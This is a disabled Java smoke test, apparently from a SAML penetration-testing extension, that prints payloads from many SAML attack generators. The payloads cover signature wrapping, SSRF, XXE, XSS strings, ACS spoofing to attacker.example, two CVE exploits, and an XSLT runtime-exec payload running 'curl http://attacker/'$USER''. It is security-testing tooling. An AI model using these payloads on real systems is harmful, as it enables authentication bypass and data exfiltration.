package helpers;

import model.BurpCertificate;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Disabled;

import java.io.ByteArrayInputStream;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.Base64;

/// Diagnostic sanity-check: feed a single realistic SAMLResponse through every
/// helper and print the resulting payloads. Disabled by default — only run
/// manually via `./gradlew test --tests PayloadSmokeTest -Dsmoke=on` to eyeball
/// that payloads look like what they should.
@Disabled("manual smoke test; remove @Disabled to print every payload for visual verification")
public class PayloadSmokeTest {

    private static final String CERT_B64 =
            "MIIC6TCCAdGgAwIBAgIIHC0ZtKe0AzswDQYJKoZIhvcNAQELBQAwGTEXMBUGA1UEAxMOc2FtbC1pZHAtbG9jYWwwHhcNMjUwOTIzMTEwNDEwWhcNMjYwOTIzMTIwNDEwWjAZMRcwFQYDVQQDEw5zYW1sLWlkcC1sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOBOjNVc6C9uDgkRZ30lBz97rRnm8Us1t8/I8hYTLuIsNg3Rs5S2OMmJYnvMeMEYBJGFXqMEtqpRJkDVJujk1NKCB5bJJwadjFULruNF8NnO7G99q+XG1S2fxjDgi+Im/U2+dBmMJNWAJDc54hIBZbv+7jQXUiXQrnaDUX79OGNxQ/I5IC9wLK1xb1wywM4vWx5TrQXfbeMJwYOG3NAGGLayOCjrfIz4yIya8+rzSqWc4ZY0a+VPRFWmaooDw878pQuQJaijFWZbTdSXAwz7Dgm3jeLw/9roYADFtFqK3YMFBg3R8NM6GRhmFce6B9pbu5GM7+uUXFHWFJ2go5MhfOECAwEAAaM1MDMwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBACCpxbXeD8VL+V38f/qrP7H69oP6BHF/snZxmkI8FhsxSPGN9HKZxZpHy8DxLGB/dER4m6pekhpx2NhrNKreh/z4WTYTyI8hALBdZ32XTzDXJtcDIu0znlbngMFgZ+H+GcC9TmIET2FBXpKXnp0On6EsgLZf0NsPVLjcYgfxT9v3DTJqzVajjrK6dSIcoUsswbb0veV11ao3GYkkr/6Mrfb5AB5c+tMe33zJyTlpXEQLa6uwvYLNSWIfySfQcjZUFJpzCvfWVXUdiESn1HSYLz95uFru57syVm6ReI0WulOGL0YvJz/inL9J2QNO11z3Qr95hJYJ/j+k/IGOMcwOAD4=";

    private static final String SAML = ("""
            <?xml version="1.0" encoding="UTF-8"?>
            <samlp:Response xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                ID="r1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z"
                Destination="https://sp.example.com/acs">
              <saml:Issuer>https://idp.example.com</saml:Issuer>
              <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Requester"/></samlp:Status>
              <saml:Assertion ID="a1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
                <saml:Issuer>https://idp.example.com</saml:Issuer>
                <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                  <ds:SignedInfo>
                    <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                    <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha256"/>
                    <ds:Reference URI="#a1">
                      <ds:Transforms>
                        <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
                        <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                      </ds:Transforms>
                      <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
                      <ds:DigestValue>ORIGINALDIGEST==</ds:DigestValue>
                    </ds:Reference>
                  </ds:SignedInfo>
                  <ds:SignatureValue>ORIGINALSIG</ds:SignatureValue>
                  <ds:KeyInfo>
                    <ds:X509Data><ds:X509Certificate>%s</ds:X509Certificate></ds:X509Data>
                  </ds:KeyInfo>
                </ds:Signature>
                <saml:Subject>
                  <saml:NameID>admin@victim.com</saml:NameID>
                  <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                    <saml:SubjectConfirmationData NotOnOrAfter="2024-01-01T00:05:00Z"/>
                  </saml:SubjectConfirmation>
                </saml:Subject>
                <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2024-01-01T00:05:00Z">
                  <saml:AudienceRestriction><saml:Audience>https://sp.example.com</saml:Audience></saml:AudienceRestriction>
                </saml:Conditions>
              </saml:Assertion>
            </samlp:Response>
            """).formatted(CERT_B64);

    private static final String ENC_SAML = """
            <?xml version="1.0" encoding="UTF-8"?>
            <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="r1">
              <saml:EncryptedAssertion>
                <xenc:EncryptedData xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Type="http://www.w3.org/2001/04/xmlenc#Element">
                  <xenc:EncryptionMethod Algorithm="http://www.w3.org/2009/xmlenc11#aes256-gcm"/>
                  <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                    <xenc:EncryptedKey>
                      <xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#rsa-oaep-mgf1p"/>
                      <ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIDUMMY</ds:X509Certificate></ds:X509Data></ds:KeyInfo>
                      <xenc:CipherData><xenc:CipherValue>WRAPPED_KEY</xenc:CipherValue></xenc:CipherData>
                    </xenc:EncryptedKey>
                  </ds:KeyInfo>
                  <xenc:CipherData><xenc:CipherValue>PAYLOAD</xenc:CipherValue></xenc:CipherData>
                </xenc:EncryptedData>
              </saml:EncryptedAssertion>
            </samlp:Response>
            """;

    private static final String AUTHN_REQ = """
            <?xml version="1.0" encoding="UTF-8"?>
            <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="id-40d576" Version="2.0" IssueInstant="2024-01-01T00:00:00Z"
                AssertionConsumerServiceURL="https://sp.example.com/acs">
              <saml:Issuer>https://sp.example.com/metadata</saml:Issuer>
            </samlp:AuthnRequest>
            """;

    private static void dump(String label, String xml) {
        System.out.println("\n======== " + label + " ========");
        System.out.println(xml);
    }

    @Test
    void dumpAllPayloads() throws Exception {
        dump("ORIGINAL", SAML);

        // Pure XML-level transforms
        dump("DigestTamper", DigestTamper.apply(SAML));
        dump("KeyInfoSSRF", KeyInfoSSRF.apply(SAML, "https://collab.example/key"));
        dump("SignatureRefSSRF.REFERENCE_URI",
                SignatureRefSSRF.apply(SAML, SignatureRefSSRF.Mode.REFERENCE_URI, "https://collab.example/ref"));
        dump("SignatureRefSSRF.XPATH_DOCUMENT",
                SignatureRefSSRF.apply(SAML, SignatureRefSSRF.Mode.XPATH_DOCUMENT, "https://collab.example/xp"));
        dump("SignatureRefSSRF.BASE64_XXE",
                SignatureRefSSRF.apply(SAML, SignatureRefSSRF.Mode.BASE64_XXE, "https://collab.example/oob"));

        dump("HMACConfusion", HMACConfusion.apply(SAML));

        // Dupe Key — need BurpCertificate
        BurpCertificate attacker = new BurpCertificate(
                (X509Certificate) CertificateFactory.getInstance("X.509")
                        .generateCertificate(new ByteArrayInputStream(Base64.getDecoder().decode(CERT_B64))));
        dump("DupeKeyConfusion", DupeKeyConfusion.apply(SAML, attacker, "VICTIM_ORIGINAL_CERT_B64"));

        // Assertion-level
        dump("AssertionManipulator.extendValidity(24h)", AssertionManipulator.extendValidity(SAML, 24));
        dump("AssertionManipulator.forceStatusSuccess", AssertionManipulator.forceStatusSuccess(SAML));
        dump("AssertionManipulator.removeAudience", AssertionManipulator.removeAudienceRestriction(SAML));

        // NameID injection family
        for (var p : CommentInjection.Position.values()) {
            dump("CommentInjection." + p.name(), CommentInjection.apply(SAML, p));
        }
        for (var p : PIInjection.Position.values()) {
            dump("PIInjection." + p.name(), PIInjection.apply(SAML, p));
        }

        // Response-level injections
        dump("ResponseXSS.DESTINATION",
                ResponseXSS.apply(SAML, ResponseXSS.Target.DESTINATION, "\"><script>alert(1)</script>"));
        dump("ResponseXSS.ISSUER",
                ResponseXSS.apply(SAML, ResponseXSS.Target.ISSUER, "<img src=x onerror=alert(1)>"));

        // Issuer confusion
        for (var m : IssuerConfusion.Mode.values()) {
            String out = IssuerConfusion.apply(SAML, m);
            dump("IssuerConfusion." + m.name(), out);
            // Print the Issuer line with hex so we can verify exotic codepoints by eye
            int start = out.indexOf("<saml:Issuer>");
            int end = out.indexOf("</saml:Issuer>", start);
            if (start >= 0 && end > start) {
                String text = out.substring(start + "<saml:Issuer>".length(), end);
                StringBuilder hex = new StringBuilder();
                for (int i = 0; i < text.length(); i++) {
                    hex.append(String.format("%04X ", (int) text.charAt(i)));
                }
                System.out.println("    issuer codepoints: " + hex);
            }
        }

        // Encryption SSRF
        for (var m : EncryptionSSRF.Mode.values()) {
            dump("EncryptionSSRF." + m.name(),
                    EncryptionSSRF.apply(ENC_SAML, m, "https://collab.example/enc"));
        }

        // Request-side
        dump("ACSSpoof", ACSSpoof.apply(AUTHN_REQ, "https://attacker.example/capture"));

        // CVE payloads
        dump("CVE_2022_41912", CVE_2022_41912.apply(SAML));
        dump("CVE_2024_45409", CVE_2024_45409.apply(SAML));

        // XSLT payload strings (plain stylesheet, without the wrapper Transform element)
        System.out.println("\n======== XSLTPayloads.SAXON_UNPARSED_TEXT ========");
        System.out.println(XSLTPayloads.stylesheetFor(
                XSLTPayloads.Flavor.SAXON_UNPARSED_TEXT, "https://collab.example/x"));
        System.out.println("\n======== XSLTPayloads.XALAN_RUNTIME_EXEC ========");
        System.out.println(XSLTPayloads.stylesheetFor(
                XSLTPayloads.Flavor.XALAN_RUNTIME_EXEC, "curl http://attacker/'$USER'"));
        System.out.println("\n======== XSLTPayloads.XALAN_CLASS_INSTANTIATION ========");
        System.out.println(XSLTPayloads.stylesheetFor(
                XSLTPayloads.Flavor.XALAN_CLASS_INSTANTIATION, "https://collab.example/x.bin"));
    }
}
